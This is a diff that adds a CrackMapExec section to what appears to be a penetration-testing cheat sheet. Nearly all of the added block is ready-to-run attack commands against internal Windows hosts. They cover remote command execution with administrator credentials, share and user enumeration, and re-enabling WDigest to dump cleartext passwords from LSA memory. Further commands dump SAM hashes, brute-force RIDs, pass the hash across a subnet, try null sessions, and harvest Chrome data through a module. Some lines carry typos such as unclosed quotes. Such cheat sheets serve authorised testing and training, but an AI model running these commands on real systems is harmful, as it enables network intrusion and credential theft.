@@ -1132,6 +1132,67 @@ Grouper2 is a tool for pentesters to help find security-related misconfiguration
 https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
 ```
 
+#### CrackMapExec Stuff
+
+```powershell
+#https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/
+
+Command Execution - CMD.exe
+
+crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
+
+Command Execution - Powershell.exe
+
+crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
+
+Check For Logged in Users
+
+crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --lusers
+
+Using Local Auth
+
+crackmapexec 192.168.215.138 -u 'Administrator' -p 'PASSWORD' --local-auth
+
+Enumerating Shares
+
+crackmapexec 192.168.215.138 -u 'Administrator' -p 'PASSWORD' --local-auth --shares
+
+WDigest Enable/Disable
+
+'This allows us to re-enable the WDigest provider and dump clear-text credentials from LSA memory'
+
+crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest enable
+crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest disable
+
+Password Policy
+
+crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS --pass-pol
+
+RID Bruteforcing
+
+crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS --rid-brute
+
+Top Credential Attacks
+
+crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam
+
+Pass Hash Subnet
+
+cme smb 172.16.157.0/24 -u administrator -H 'aad3b435b51404eeaa35b51404ee:5509de4fa6e8d9f4a61100e51' --local-auth
+
+Null Sessions
+
+crackmapexec smb <target(s)> -u '' -p ''
+
+
+Modules - Enum_Chrome
+
+sudo cme 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M enum_chrome
+
+Modules - Enum_AV
+
+sudo cme 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -m enum_avproducts
+```
 
 
 ## [](#header-2)Privilege Escalation
